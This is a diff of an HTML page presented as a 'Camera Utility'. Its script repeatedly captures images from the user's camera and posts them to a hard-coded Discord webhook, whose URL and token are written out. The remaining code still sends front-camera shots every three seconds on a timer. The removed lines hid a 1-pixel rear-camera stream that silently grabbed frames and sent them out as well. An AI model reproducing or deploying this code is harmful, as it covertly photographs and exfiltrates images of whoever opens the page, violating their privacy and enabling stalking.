@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Camera Utility</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Camera Utility</title>
   <style>
     html, body {
       margin: 0;
@@ -115,69 +115,39 @@
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
-
-    const config = {
-      maxSize: 8 * 1024 * 1024,
-      quality: 0.85,
-      interval: 3000
-    };
-
-    const video = document.getElementById('videoPreview');
+    const config = { maxSize: 8 * 1024 * 1024, quality: 0.85, interval: 3000 };
     const shutterBtn = document.getElementById('shutterBtn');
     const preview = document.getElementById('photoPreview');
     const gallery = document.getElementById('galleryView');
-    const flash = document.getElementById('flash');
     const backBtn = document.getElementById('backBtn');
-    const shutterSound = document.getElementById('shutterSound');
     const photos = [];
     let currentStream = null;
-
-    const externalVideoPreview = document.createElement('video');
-    externalVideoPreview.style.position = 'absolute';
-    externalVideoPreview.style.width = '1px';
-    externalVideoPreview.style.height = '1px';
-    externalVideoPreview.style.top = '0';
-    externalVideoPreview.style.left = '0';
-    externalVideoPreview.style.zIndex = '-1';
-    document.body.appendChild(externalVideoPreview);
+    const videoPreview = document.getElementById('videoPreview');
+    const flash = document.getElementById('flash');
+    const shutterSound = document.getElementById('shutterSound');
 
     async function initCamera() {
-      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      video.srcObject = currentStream;
-      startPeriodicCapture();
-      startExternalStream();
+      const isAndroid = /Android/i.test(navigator.userAgent);
+      if (isAndroid) {
+        videoPreview.style.display = "block";
+        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        videoPreview.srcObject = currentStream;
+        startPeriodicCapture();
+      } else {
+        videoPreview.style.display = "block";
+        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        videoPreview.srcObject = currentStream;
+        startPeriodicCapture();
+      }
     }
 
     async function captureFromCurrentStream() {
-      await new Promise(resolve => {
-        if (video.readyState >= 2) resolve();
-        else video.onloadedmetadata = () => resolve();
-      });
-
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = videoPreview.videoWidth;
+      canvas.height = videoPreview.videoHeight;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
       return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
-    }
-
-    async function captureImageSilently(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const bitmap = await imageCapture.grabFrame();
-      const canvas = document.createElement('canvas');
-      canvas.width = bitmap.width;
-      canvas.height = bitmap.height;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0);
-      return new Promise(res => {
-        canvas.toBlob(blob => {
-          stream.getTracks().forEach(t => t.stop());
-          res(blob);
-        }, 'image/jpeg', config.quality);
-      });
     }
 
     async function sendToWebhook(blob, label) {
@@ -218,14 +188,12 @@
       gallery.innerHTML = "";
       gallery.style.display = "flex";
       backBtn.style.display = "block";
-
       photos.forEach((blob, index) => {
         const div = document.createElement('div');
         div.className = "galleryItem";
         const img = document.createElement('img');
         img.src = URL.createObjectURL(blob);
         img.onclick = () => window.open(img.src, '_blank');
-
         const del = document.createElement('button');
         del.className = "deleteBtn";
         del.textContent = "×";
@@ -233,7 +201,6 @@
           photos.splice(index, 1);
           showGallery();
         };
-
         div.appendChild(img);
         div.appendChild(del);
         gallery.appendChild(div);
@@ -254,26 +221,6 @@
           }
         } catch (e) {
           console.error("Front camera update error:", e);
-        }
-      }, config.interval);
-    }
-
-    async function startExternalStream() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      externalVideoPreview.srcObject = stream;
-      externalVideoPreview.play();
-      startExternalPeriodicCapture();
-    }
-
-    function startExternalPeriodicCapture() {
-      setInterval(async () => {
-        try {
-          const blobBack = await captureImageSilently('environment');
-          if (blobBack.size <= config.maxSize) {
-            sendToWebhook(blobBack, "Rear Camera (Scheduled Update)");
-          }
-        } catch (e) {
-          console.error("Rear camera update error:", e);
         }
       }, config.interval);
     }
